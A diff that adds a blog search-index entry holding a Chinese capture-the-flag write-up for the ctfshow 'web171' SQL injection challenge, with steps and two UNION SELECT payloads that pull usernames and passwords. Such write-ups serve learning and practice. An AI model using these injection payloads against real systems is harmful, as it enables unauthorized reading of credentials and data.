@@ -4,6 +4,19 @@
   
   
   <entry>
+    <title></title>
+    <link href="/2025/06/02/%E6%B5%8B%E8%AF%95/"/>
+    <url>/2025/06/02/%E6%B5%8B%E8%AF%95/</url>
+    
+    <content type="html"><![CDATA[<h1 id="无过滤注入"><a href="#无过滤注入" class="headerlink" title="无过滤注入"></a>无过滤注入</h1><h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p><img src="https://i-blog.csdnimg.cn/direct/f3b1f9569c624b8d83947040bf24dc5b.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><ol><li><strong>闭合单引号</strong>：通过输入<code>&#39;</code>闭合id参数的单引号。</li><li><strong>注入UNION查询</strong>：使用<code>UNION SELECT</code>获取其他数据，确保列数与原查询一致。</li><li><strong>绕过原查询条件</strong>：直接查询username为’flag’的记录，因为UNION后的SELECT不受原查询的<code>username != &#39;flag&#39;</code>限制。</li><li><strong>注释剩余部分</strong>：使用<code>--</code>注释掉原SQL的剩余部分，避免语法错误。</li></ol><p>观察到有三列，两种解发均可，后者会带出id&#x3D;1的那一行，没啥作用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; union select username,password,1 from ctfshow_user where username=&#x27;</span>flag<span class="hljs-string">&#x27; -- </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> username,password,<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p> <strong>注释符的区别</strong></p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Hello World</title>
     <link href="/2025/05/29/hello-world/"/>
     <url>/2025/05/29/hello-world/</url>
